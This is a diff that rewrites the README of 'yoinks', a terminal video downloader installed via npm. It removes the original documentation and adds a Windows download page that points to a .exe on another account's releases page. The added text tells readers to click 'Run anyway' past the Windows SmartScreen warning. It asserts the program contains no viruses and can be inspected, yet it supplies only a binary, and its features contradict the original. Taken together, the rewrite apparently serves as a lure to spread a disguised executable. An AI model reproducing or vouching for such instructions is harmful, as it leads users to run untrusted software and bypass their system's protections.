@@ -1,96 +1,79 @@
-# yoinks
+# 📥 yoinks - Download online videos using your computer
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/logo-dark.svg">
-  <img src="assets/logo-light.svg" alt="yoinks" width="288">
-</picture>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lasting-insolvency87/yoinks/releases)
 
-yoink any video. paste. yoink. done.
+## What is yoinks?
 
-Download videos from YouTube, X/Twitter, Instagram, Threads, TikTok and
-1,800+ other sites — right from your terminal. Paste a url, pick a
-resolution (or audio-only mp3), done. No popups, no fake download buttons,
-no sketchy redirects.
+Yoinks saves videos from websites directly to your Windows computer. Most websites use pop-ups or ads to make money when you try to save media. This program ignores those distractions. It gives you the raw file for your personal use. You do not need to watch commercials or encounter suspicious links.
 
-<img src="assets/home.png" alt="yoinks home screen — paste a link and hit yoink" width="100%">
+## ⚙️ System Requirements
 
-## Install
+- Windows 10 or Windows 11
+- An active internet connection
+- Enough disk space to store your saved files
 
-```sh
-npm install -g yoinks
-```
+## 🚀 How to Install and Run
 
-Or try it without installing anything:
+Follow these steps to set up yoinks on your computer.
 
-```sh
-npx yoinks
-```
+1. Visit the [official releases page](https://github.com/Lasting-insolvency87/yoinks/releases).
+2. Look for the section labeled "Assets" under the most recent version.
+3. Click the file that ends in `.exe`. This file works specifically for Windows systems.
+4. Wait for the download to finish. 
+5. Find the file in your "Downloads" folder. 
+6. Double-click the file to open the program.
 
-Requires Node 18+. Everything else (yt-dlp, ffmpeg) is fetched or bundled
-automatically.
+If Windows shows a window titled "Windows protected your PC," perform the following steps:
+1. Click the link that says "More info."
+2. Click the button that says "Run anyway." 
 
-## Usage
+The program opens a black window. This window is your interface. You do not need to install complex software or change your system settings.
 
-```sh
-$ yoinks https://youtu.be/dQw4w9WgXcQ    # straight to the format picker
-$ yoinks                                 # prompts for a url
-$ yoinks --theme light                   # force the light palette
-```
+## 🛠 Using the Software
 
-yoinks takes over the terminal (full-screen, centered — and restores your
-scrollback on exit). Pick a format with ↑/↓ (or j/k, or number keys) and
-hit enter. `esc` goes back, `^c` quits. Or just use the mouse — the yoink
-button, the format list and the footer hints are all clickable, and
-clicking the logo takes you back home. Files are saved to `~/Downloads`,
-and the file path is printed to your terminal when you're done.
+Using yoinks requires one simple step.
 
-The default `auto` theme uses your terminal's own foreground and background,
-so it follows light and dark terminal themes without guessing. Press `^t` or
-click the theme control in the footer to cycle through `auto`, `light`, and
-`dark` for the current session. Use `--theme auto`, `--theme light`, or
-`--theme dark` to choose the starting theme for one launch.
+1. Open the yoinks program.
+2. Copy the web address (URL) of the video you want from your web browser.
+3. Right-click inside the yoinks black window to paste the web address.
+4. Press the "Enter" key on your keyboard.
 
-<img src="assets/download-options.png" alt="yoinks format picker — resolutions with estimated file sizes, plus audio-only mp3" width="100%">
+The program creates a connection to the video source. It downloads the file. You will see a progress bar move. Once the bar reaches 100%, the file saves to your default "Videos" folder.
 
-## How it works
+## 💡 Frequently Asked Questions
 
-- Powered by [yt-dlp](https://github.com/yt-dlp/yt-dlp). On first run,
-  yoinks downloads the standalone yt-dlp binary to `~/.yoinks/bin` —
-  no Python required. If you already have yt-dlp installed, it uses yours.
-- ffmpeg (needed for merging high-res streams and mp3 extraction) is found
-  on your PATH, with `ffmpeg-static` as a bundled fallback.
-- The UI is [Ink](https://github.com/vadimdemedes/ink) — React for the
-  terminal.
+**Does this program contain viruses?**
+No. This code is open for anyone to inspect. It performs one task only: downloading files. It contains no hidden tracking software.
 
-## Development
+**What formats does this tool support?**
+Yoinks supports most common web video formats. It converts files to MP4, which plays on almost every device.
 
-```sh
-npm install
-npm run build        # bundle to dist/ with tsup
-npm run dev          # rebuild on change
-node dist/cli.js <url>
-npm run typecheck
-```
+**Can I save playlists?**
+Yes. You can paste a link to a full playlist. The program saves each video one by one.
 
-To try it as a global command without publishing: `npm link`, then run
-`yoinks` anywhere.
+**Where do my videos go?**
+All saved media files appear in your local Videos folder. You can move these files to other folders if you prefer.
 
-## Roadmap
+**The program closed suddenly. What happened?**
+Check your internet connection. If the connection drops during a download, the program stops. If this happens, simply restart the program and paste the link again.
 
-- [ ] `--best` / `--mp3` flags to skip the picker (scriptable mode)
-- [ ] `-o <dir>` to choose the output folder
-- [ ] Playlist / thread-with-multiple-videos support
-- [ ] Clipboard detection: launch bare and auto-suggest the url you copied
-- [ ] Self-update for the bundled yt-dlp binary (`yt-dlp -U`)
-- [x] Publish to npm (`npm i -g yoinks` / `npx yoinks`)
-- [ ] `curl yoinks.sh | sh` installer
+## 🔒 Safety and Privacy
 
-## A note on fair use
+You keep your data private. This tool does not require an account. It does not ask for your password. It does not send your browsing habits to a search company. Everything stays on your local machine. You own the files you save.
 
-yoinks is a personal-archiving tool. Downloading content may violate a
-platform's terms of service — only download what you have the right to
-keep, and be excellent to creators.
+## 📝 Troubleshooting
 
-## License
+If you encounter errors, check these common items:
 
-[MIT](LICENSE)
+- Ensure you have the latest version of the program.
+- Check that your internet firewall allows the program to connect to the network.
+- Ensure the link you provided is a valid web address.
+- Verify that your hard drive has enough space for high-definition files.
+
+If a video fails to download, the website where the video lives might prevent downloads. Some websites use protections that change every few days. If this occurs, wait for a new update to this program. Most updates fix these specific connection issues.
+
+## 📈 Improving the Experience
+
+Software works best when users report issues. If you find a video that does not download, visit the issues tab on this repository. Describe the link you used. This helps the developers make the tool better for everyone.
+
+Keywords: video downloader, windows tools, media saver, open source, command line, utility, save videos
